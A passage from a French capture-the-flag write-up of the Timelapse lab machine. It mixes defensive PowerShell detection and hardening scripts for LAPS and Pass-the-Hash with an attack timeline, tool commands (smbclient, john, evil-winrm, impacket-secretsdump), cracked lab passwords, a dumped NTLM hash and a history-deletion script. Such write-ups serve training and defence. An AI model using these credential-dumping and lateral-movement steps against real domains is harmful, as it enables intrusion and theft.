+</span></span><span style="display:flex;"><span>$encrypted | Out-File C:\secure\cred.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour réutiliser</span>
+</span></span><span style="display:flex;"><span>$securePass = Get-Content C:\secure\cred.txt | ConvertTo-SecureString
+</span></span><span style="display:flex;"><span>$creds = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#34;user&#34;</span>, $securePass)
+</span></span></code></pre></div><ol start="2">
+<li><strong>Désactiver ou limiter l&rsquo;historique :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Désactiver l&#39;historique (pas recommandé pour détection)</span>
+</span></span><span style="display:flex;"><span>Set-PSReadlineOption -HistorySaveStyle SaveNothing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Limiter la taille de l&#39;historique</span>
+</span></span><span style="display:flex;"><span>Set-PSReadlineOption -MaximumHistoryCount <span style="color:#ae81ff">100</span>
+</span></span></code></pre></div><ol start="3">
+<li><strong>Nettoyage régulier :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Script de nettoyage automatique</span>
+</span></span><span style="display:flex;"><span>$historyPath = <span style="color:#e6db74">&#34;</span>$env:APPDATA<span style="color:#e6db74">\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Test-Path $historyPath) {
+</span></span><span style="display:flex;"><span>    Remove-Item $historyPath -Force
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol start="4">
+<li><strong>Monitoring PowerShell :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Activer Transcription (enregistre TOUT)</span>
+</span></span><span style="display:flex;"><span>$RegPath = <span style="color:#e6db74">&#34;HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription&#34;</span>
+</span></span><span style="display:flex;"><span>New-Item -Path $RegPath -Force
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path $RegPath -Name <span style="color:#e6db74">&#34;EnableTranscripting&#34;</span> -Value <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path $RegPath -Name <span style="color:#e6db74">&#34;OutputDirectory&#34;</span> -Value <span style="color:#e6db74">&#34;C:\PSLogs&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Activer Script Block Logging</span>
+</span></span><span style="display:flex;"><span>$RegPath = <span style="color:#e6db74">&#34;HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&#34;</span>
+</span></span><span style="display:flex;"><span>New-Item -Path $RegPath -Force
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path $RegPath -Name <span style="color:#e6db74">&#34;EnableScriptBlockLogging&#34;</span> -Value <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="-détection--hardening-laps">🛡️ Détection &amp; Hardening LAPS<a hidden class="anchor" aria-hidden="true" href="#-détection--hardening-laps">#</a></h3>
+<p><strong>Event IDs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4662 - Opération effectuée sur un objet AD</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Surveillance lecture de ms-Mcs-AdmPwd</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4662</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;ms-Mcs-AdmPwd&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4624 - Logon avec password LAPS</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">5</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Administrator&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Script de Monitoring LAPS :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Surveiller qui lit les passwords LAPS</span>
+</span></span><span style="display:flex;"><span>$Events = Get-WinEvent -LogName Security -MaxEvents <span style="color:#ae81ff">1000</span> | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4662</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">6</span>].Value <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;ms-Mcs-AdmPwd&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($Event <span style="color:#66d9ef">in</span> $Events) {
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">PSCustomObject</span>]@{
+</span></span><span style="display:flex;"><span>        Time = $Event.TimeCreated
+</span></span><span style="display:flex;"><span>        User = $Event.Properties[<span style="color:#ae81ff">1</span>].Value
+</span></span><span style="display:flex;"><span>        Computer = $Event.Properties[<span style="color:#ae81ff">8</span>].Value
+</span></span><span style="display:flex;"><span>        Action = <span style="color:#e6db74">&#34;LAPS Password Read&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations Critiques :</strong></p>
+<ol>
+<li><strong>Restreindre le groupe LAPS_Readers :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Auditer les membres</span>
+</span></span><span style="display:flex;"><span>Get-ADGroupMember <span style="color:#e6db74">&#34;LAPS_Readers&#34;</span> | Select-Object Name, SamAccountName
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Retirer utilisateurs non autorisés</span>
+</span></span><span style="display:flex;"><span>Remove-ADGroupMember -Identity <span style="color:#e6db74">&#34;LAPS_Readers&#34;</span> -Members svc_deploy -Confirm:$false
+</span></span></code></pre></div><ol start="2">
+<li><strong>Implémenter LAPS avec chiffrement (Windows LAPS) :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Windows LAPS (depuis Windows Server 2025 / Windows 11 22H2)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chiffre le mot de passe dans AD avec DPAPI</span>
+</span></span><span style="display:flex;"><span>Set-LapsADPasswordExpirationTime -Identity <span style="color:#e6db74">&#34;DC01&#34;</span> -WhenEffective (Get-Date).AddDays(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><ol start="3">
+<li><strong>Alertes en temps réel :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Script de détection en temps réel</span>
+</span></span><span style="display:flex;"><span>Register-WMIEvent -Query <span style="color:#e6db74">&#34;SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA &#39;Win32_NTLogEvent&#39; AND TargetInstance.EventCode = 4662&#34;</span> -Action {
+</span></span><span style="display:flex;"><span>    $Event = $EventArgs.NewEvent.TargetInstance
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($Event.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;ms-Mcs-AdmPwd&#34;</span>) {
+</span></span><span style="display:flex;"><span>        Send-MailMessage -To <span style="color:#e6db74">&#34;soc@company.com&#34;</span> -Subject <span style="color:#e6db74">&#34;LAPS Password Access&#34;</span> -Body $Event.Message
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol start="4">
+<li><strong>Rotation fréquente :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Forcer rotation immédiate</span>
+</span></span><span style="display:flex;"><span>Set-AdmPwdComputerSelfPermission -Identity <span style="color:#e6db74">&#34;DC01&#34;</span>
+</span></span><span style="display:flex;"><span>Reset-AdmPwdPassword -ComputerName <span style="color:#e6db74">&#34;DC01&#34;</span>
+</span></span></code></pre></div><h3 id="-détection-pass-the-hash">🛡️ Détection Pass-the-Hash<a hidden class="anchor" aria-hidden="true" href="#-détection-pass-the-hash">#</a></h3>
+<p><strong>Event IDs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4624 - Logon Type 3 (Network) avec NTLM</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">8</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#f92672">-and</span>  <span style="color:#75715e"># Logon Type = Network</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">10</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;10&#34;</span>     <span style="color:#75715e"># Authentication Package = NTLM</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4625 - Échec de logon (tentatives multiples)</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4625</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Script de Détection Pass-the-Hash :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Détecter logons suspects (même hash, IPs différentes)</span>
+</span></span><span style="display:flex;"><span>$LogonEvents = Get-WinEvent -LogName Security -MaxEvents <span style="color:#ae81ff">10000</span> | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span> $_.Properties[<span style="color:#ae81ff">8</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;3&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$Logons = $LogonEvents | ForEach-Object {
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">PSCustomObject</span>]@{
+</span></span><span style="display:flex;"><span>        Time = $_.TimeCreated
+</span></span><span style="display:flex;"><span>        User = $_.Properties[<span style="color:#ae81ff">5</span>].Value
+</span></span><span style="display:flex;"><span>        SourceIP = $_.Properties[<span style="color:#ae81ff">18</span>].Value
+</span></span><span style="display:flex;"><span>        LogonType = $_.Properties[<span style="color:#ae81ff">8</span>].Value
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Grouper par utilisateur et détecter anomalies</span>
+</span></span><span style="display:flex;"><span>$Logons | Group-Object User | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Group.SourceIP | Select-Object -Unique | Measure-Object | Select-Object -ExpandProperty Count <span style="color:#f92672">-gt</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>} | Select-Object Name, Count
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Désactiver NTLM (si possible) :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Via GPO : Computer Configuration → Windows Settings → Security Settings</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → Local Policies → Security Options</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → Network security: LAN Manager authentication level = Send NTLMv2 response only. Refuse LM &amp; NTLM</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Via Registre</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> -Name <span style="color:#e6db74">&#34;LmCompatibilityLevel&#34;</span> -Value <span style="color:#ae81ff">5</span>
+</span></span></code></pre></div><ol start="2">
+<li><strong>Protected Users Security Group :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Ajouter utilisateurs sensibles (empêche NTLM, DES, RC4)</span>
+</span></span><span style="display:flex;"><span>Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Protected Users&#34;</span> -Members Administrator, svc_deploy
+</span></span></code></pre></div><ol start="3">
+<li><strong>Credential Guard (Windows 10/11/Server 2016+) :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Activer Credential Guard (protection hardware-based)</span>
+</span></span><span style="display:flex;"><span>Enable-WindowsOptionalFeature -FeatureName VirtualMachinePlatform -Online -NoRestart
+</span></span><span style="display:flex;"><span>bcdedit /set {<span style="color:#66d9ef">default</span>} hypervisorlaunchtype auto
+</span></span></code></pre></div><hr>
+<h2 id="-timeline-détaillée">🔟 TIMELINE DÉTAILLÉE<a hidden class="anchor" aria-hidden="true" href="#-timeline-détaillée">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Temps</th>
+<th>Action</th>
+<th>Résultat</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T+0</td>
+<td>Nmap port scan</td>
+<td>DC Windows identifié (53, 88, 389, 445, 5986)</td>
+</tr>
+<tr>
+<td>T+5</td>
+<td>Nmap service scan</td>
+<td>Domain: timelapse.htb, Hostname: DC01</td>
+</tr>
+<tr>
+<td>T+10</td>
+<td>SMB enumeration (anonymous)</td>
+<td>Partage &ldquo;Shares&rdquo; accessible</td>
+</tr>
+<tr>
+<td>T+15</td>
+<td>SMB navigation</td>
+<td>Dossiers Dev/ et HelpDesk/ découverts</td>
+</tr>
+<tr>
+<td>T+18</td>
+<td>SMB download</td>
+<td>winrm_backup.zip téléchargé (2.6 KB)</td>
+</tr>
+<tr>
+<td>T+20</td>
+<td>Tentative extraction ZIP</td>
+<td>Protégé par mot de passe ❌</td>
+</tr>
+<tr>
+<td>T+22</td>
+<td>zip2john conversion</td>
+<td>Hash généré pour John</td>
+</tr>
+<tr>
+<td>T+25</td>
+<td>John cracking (ZIP)</td>
+<td><strong>supremelegacy</strong> (3 secondes)</td>
+</tr>
+<tr>
+<td>T+27</td>
+<td>Extraction ZIP</td>
+<td>legacyy_dev_auth.pfx obtenu</td>
+</tr>
+<tr>
+<td>T+30</td>
+<td>Tentative extraction PFX</td>
+<td>Protégé par mot de passe ❌</td>
+</tr>
+<tr>
+<td>T+32</td>
+<td>pfx2john conversion</td>
+<td>Erreur asn1crypto ❌</td>
+</tr>
+<tr>
+<td>T+35</td>
+<td>Installation asn1crypto</td>
+<td><code>sudo apt install python3-asn1crypto</code></td>
+</tr>
+<tr>
+<td>T+37</td>
+<td>pfx2john retry</td>
+<td>Hash généré pour John</td>
+</tr>
+<tr>
+<td>T+40</td>
+<td>John cracking (PFX)</td>
+<td><strong>thuglegacy</strong> (5 secondes)</td>
+</tr>
+<tr>
+<td>T+42</td>
+<td>OpenSSL extraction clé</td>
+<td>key.pem généré</td>
+</tr>
+<tr>
+<td>T+43</td>
+<td>OpenSSL extraction cert</td>
+<td>cert.pem généré</td>
+</tr>
+<tr>
+<td>T+45</td>
+<td>Inspection certificat</td>
+<td>UPN: <a href="mailto:legacyy@timelapse.htb">legacyy@timelapse.htb</a> découvert</td>
+</tr>
+<tr>
+<td>T+48</td>
+<td>Evil-WinRM connexion (cert)</td>
+<td>✅ <strong>Accès legacyy</strong></td>
+</tr>
+<tr>
+<td>T+50</td>
+<td>Énumération utilisateur</td>
+<td>Membre de Remote Management Users</td>
+</tr>
+<tr>
+<td>T+52</td>
+<td>Lecture user flag</td>
+<td><strong>USER FLAG</strong> 🏁</td>
+</tr>
+<tr>
+<td>T+55</td>
+<td>PowerShell history dump</td>
+<td>Credentials svc_deploy trouvés !</td>
+</tr>
+<tr>
+<td>T+58</td>
+<td>Evil-WinRM connexion (svc_deploy)</td>
+<td>✅ <strong>Accès svc_deploy</strong></td>
+</tr>
+<tr>
+<td>T+60</td>
+<td>Énumération groupes</td>
+<td>Membre de <strong>LAPS_Readers</strong> découvert</td>
+</tr>
+<tr>
+<td>T+62</td>
+<td>Get-ADComputer enumeration</td>
+<td>DC01 identifié</td>
+</tr>
+<tr>
+<td>T+65</td>
+<td>LAPS password dump</td>
+<td><strong>Password Administrator récupéré</strong></td>
+</tr>
+<tr>
+<td>T+68</td>
+<td>Evil-WinRM connexion (Administrator)</td>
+<td>✅ <strong>Accès Administrator</strong></td>
+</tr>
+<tr>
+<td>T+70</td>
+<td>Recherche root flag</td>
+<td>Trouvé dans C:\Users\TRX\Desktop\</td>
+</tr>
+<tr>
+<td>T+72</td>
+<td>Tentative lecture directe</td>
+<td>Access Denied ❌</td>
+</tr>
+<tr>
+<td>T+75</td>
+<td>impacket-secretsdump</td>
+<td>Tous les hashes NTLM dumpés</td>
+</tr>
+<tr>
+<td>T+78</td>
+<td>Identification hash TRX</td>
+<td><strong>4c7121d35cd421cbbd3e44ce83bc923e</strong></td>
+</tr>
+<tr>
+<td>T+80</td>
+<td>Evil-WinRM Pass-the-Hash (TRX)</td>
+<td>✅ <strong>Accès TRX</strong></td>
+</tr>
+<tr>
+<td>T+82</td>
+<td>Lecture root flag</td>
+<td><strong>ROOT FLAG</strong> 🏁</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Temps total :</strong> ~82 minutes</p>
+<hr>
+<h2 id="11-outils-utilisés">1️⃣1️⃣ OUTILS UTILISÉS<a hidden class="anchor" aria-hidden="true" href="#11-outils-utilisés">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Outil</th>
+<th>Version</th>
+<th>Usage</th>
+<th>Commande Clé</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Nmap</strong></td>
+<td>7.94SVN</td>
+<td>Port scanning, service detection</td>
+<td><code>nmap -p- -sCV 10.10.11.152</code></td>
+</tr>
+<tr>
+<td><strong>smbclient</strong></td>
+<td>4.17.12</td>
+<td>Énumération SMB, download fichiers</td>
+<td><code>smbclient -L //10.10.11.152 -N</code></td>
+</tr>
+<tr>
+<td><strong>John the Ripper</strong></td>
+<td>1.9.0-jumbo</td>
+<td>Cracking ZIP/PFX</td>
+<td><code>john hash.john --wordlist=rockyou.txt</code></td>
+</tr>
+<tr>
+<td><strong>OpenSSL</strong></td>
+<td>3.0.11</td>
+<td>Extraction certificat/clé privée</td>
+<td><code>openssl pkcs12 -in file.pfx -out cert.pem</code></td>
+</tr>
+<tr>
+<td><strong>Evil-WinRM</strong></td>
+<td>3.5</td>
+<td>Connexion WinRM, exploitation</td>
+<td><code>evil-winrm -i IP -c cert.pem -k key.pem -S</code></td>
+</tr>
+<tr>
+<td><strong>impacket-secretsdump</strong></td>
+<td>0.11.0</td>
+<td>Dump secrets AD (NTDS.dit)</td>
+<td><code>impacket-secretsdump user:pass@IP</code></td>
+</tr>
+<tr>
+<td><strong>PowerShell</strong></td>
+<td>5.1</td>
+<td>Énumération AD, LAPS</td>
+<td><code>Get-ADComputer -Properties ms-Mcs-AdmPwd</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="12-leçons-apprises">1️⃣2️⃣ LEÇONS APPRISES<a hidden class="anchor" aria-hidden="true" href="#12-leçons-apprises">#</a></h2>
+<h3 id="-bonnes-pratiques-offensives">✅ Bonnes Pratiques Offensives<a hidden class="anchor" aria-hidden="true" href="#-bonnes-pratiques-offensives">#</a></h3>
+<ol>
+<li>
+<p><strong>Toujours vérifier SMB Anonymous :</strong></p>
+<ul>
+<li>Première chose à tester sur un DC Windows</li>
+<li>Souvent mal configuré en environnement dev/test</li>
+</ul>
+</li>
+<li>
+<p><strong>Cracking progressif :</strong></p>
+<ul>
+<li>ZIP → PFX → Certificat (chaque couche révèle la suivante)</li>
+<li>Utiliser <code>rockyou.txt</code> en premier (rapide, souvent suffisant)</li>
+</ul>
+</li>
+<li>
+<p><strong>PowerShell History = Goldmine :</strong></p>
+<ul>
+<li>Chemin: <code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li>Contient souvent des credentials en clair</li>
+</ul>
+</li>
+<li>
+<p><strong>LAPS Abuse :</strong></p>
+<ul>
+<li>Si membre de LAPS_Readers → Admin local garanti</li>
+<li>Vérifier attribut <code>ms-Mcs-AdmPwd</code> sur tous les computers</li>
+</ul>
+</li>
+<li>
+<p><strong>Pass-the-Hash &gt; Cracking :</strong></p>
+<ul>
+<li>Pas besoin de craquer les hashes</li>
+<li>Fonctionne même avec mots de passe très complexes</li>
+</ul>
+</li>
+</ol>
+<h3 id="-vulnérabilités-critiques-identifiées">❌ Vulnérabilités Critiques Identifiées<a hidden class="anchor" aria-hidden="true" href="#-vulnérabilités-critiques-identifiées">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Vulnérabilité</th>
+<th>Impact</th>
+<th>Recommandation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SMB Anonymous Access</strong></td>
+<td>Exposition de fichiers sensibles</td>
+<td>Désactiver null sessions, restreindre partages</td>
+</tr>
+<tr>
+<td><strong>Mots de passe faibles (ZIP/PFX)</strong></td>
+<td>Cracking en secondes</td>
+<td>Utiliser 20+ caractères, gestionnaire MDP</td>
+</tr>
+<tr>
+<td><strong>Credentials en clair (PS History)</strong></td>
+<td>Compromission instantanée</td>
+<td>Utiliser Get-Credential, jamais hardcoder</td>
+</tr>
+<tr>
+<td><strong>LAPS_Readers trop permissif</strong></td>
+<td>Accès admin local sur toutes machines</td>
+<td>Limiter strictement les membres</td>
+</tr>
+<tr>
+<td><strong>ACLs permissives</strong></td>
+<td>Accès non autorisé aux fichiers</td>
+<td>Auditer régulièrement les permissions NTFS</td>
+</tr>
+<tr>
+<td><strong>NTLM activé</strong></td>
+<td>Pass-the-Hash possible</td>
+<td>Migrer vers Kerberos-only, Protected Users</td>
+</tr>
+</tbody>
+</table>
+<h3 id="-recommandations-défensives-prioritaires">🛡️ Recommandations Défensives Prioritaires<a hidden class="anchor" aria-hidden="true" href="#-recommandations-défensives-prioritaires">#</a></h3>
+<p><strong>Criticité HAUTE (à implémenter immédiatement) :</strong></p>
+<ol>
+<li>✅ Désactiver accès SMB anonyme</li>
+<li>✅ Activer PowerShell Transcription + Script Block Logging</li>
+<li>✅ Restreindre groupe LAPS_Readers (seulement Tier 0 admins)</li>
+<li>✅ Implémenter alertes sur lecture ms-Mcs-AdmPwd</li>
+</ol>
+<p><strong>Criticité MOYENNE (à planifier) :</strong></p>
+<ol start="5">
+<li>✅ Désactiver SMBv1</li>
+<li>✅ Forcer signature SMB</li>
+<li>✅ Rotation LAPS plus fréquente (7 jours au lieu de 30)</li>
+<li>✅ Utiliser Protected Users pour comptes sensibles</li>
+</ol>
+<p><strong>Criticité BASSE (nice-to-have) :</strong></p>
+<ol start="9">
+<li>✅ Migrer vers Windows LAPS (chiffrement password)</li>
+<li>✅ Credential Guard sur toutes les machines</li>
+<li>✅ MFA pour WinRM</li>
+<li>✅ Certificate Revocation Lists (CRL)</li>
+</ol>
+<hr>
+<h2 id="-ressources">📚 RESSOURCES<a hidden class="anchor" aria-hidden="true" href="#-ressources">#</a></h2>
+<h3 id="documentation-officielle">Documentation Officielle<a hidden class="anchor" aria-hidden="true" href="#documentation-officielle">#</a></h3>
+<ul>
+<li><a href="https://learn.microsoft.com/windows-server/identity/laps/laps-overview">Microsoft LAPS Documentation</a></li>
+<li><a href="https://learn.microsoft.com/windows/win32/winrm/installation-and-configuration-for-windows-remote-management">WinRM Configuration</a></li>
+<li><a href="https://learn.microsoft.com/powershell/scripting/security/security-features">PowerShell Logging</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory">Active Directory Security Best Practices</a></li>
+</ul>
+<h3 id="outils-et-frameworks">Outils et Frameworks<a hidden class="anchor" aria-hidden="true" href="#outils-et-frameworks">#</a></h3>
+<ul>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM GitHub</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket Suite</a></li>
+<li><a href="https://www.openwall.com/john/">John the Ripper</a></li>
+<li><a href="https://github.com/kfosaaen/Get-LAPSPasswords">LAPS Toolkit</a></li>
+</ul>
+<h3 id="articles-et-recherches">Articles et Recherches<a hidden class="anchor" aria-hidden="true" href="#articles-et-recherches">#</a></h3>
+<ul>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps">HackTricks - LAPS</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadsAllTheThings - Windows PrivEsc</a></li>
+<li><a href="https://adsecurity.org/?p=3299">ADSecurity - PowerShell History</a></li>
+<li><a href="https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167">SpecterOps - Pass-the-Hash</a></li>
+</ul>
+<hr>
+<h2 id="-schéma-dexploitation">📊 SCHÉMA D&rsquo;EXPLOITATION<a hidden class="anchor" aria-hidden="true" href="#-schéma-dexploitation">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌─────────────────────────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│                    CHAÎNE D&#39;ATTAQUE TIMELAPSE               │
+</span></span><span style="display:flex;"><span>└─────────────────────────────────────────────────────────────┘
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[1] ACCÈS INITIAL
+</span></span><span style="display:flex;"><span>    SMB Anonymous (445)
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    Shares\Dev\winrm_backup.zip
+</span></span><span style="display:flex;"><span>         ↓ [zip2john + john]
+</span></span><span style="display:flex;"><span>    Password: supremelegacy
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    legacyy_dev_auth.pfx
+</span></span><span style="display:flex;"><span>         ↓ [pfx2john + john]
+</span></span><span style="display:flex;"><span>    Password: thuglegacy
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    Certificate + Private Key
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    ┌──────────────────────────┐
+</span></span><span style="display:flex;"><span>    │  WinRM Certificate Auth  │
+</span></span><span style="display:flex;"><span>    │  Port 5986 (HTTPS)       │
+</span></span><span style="display:flex;"><span>    │  User: legacyy           │
+</span></span><span style="display:flex;"><span>    └──────────────────────────┘
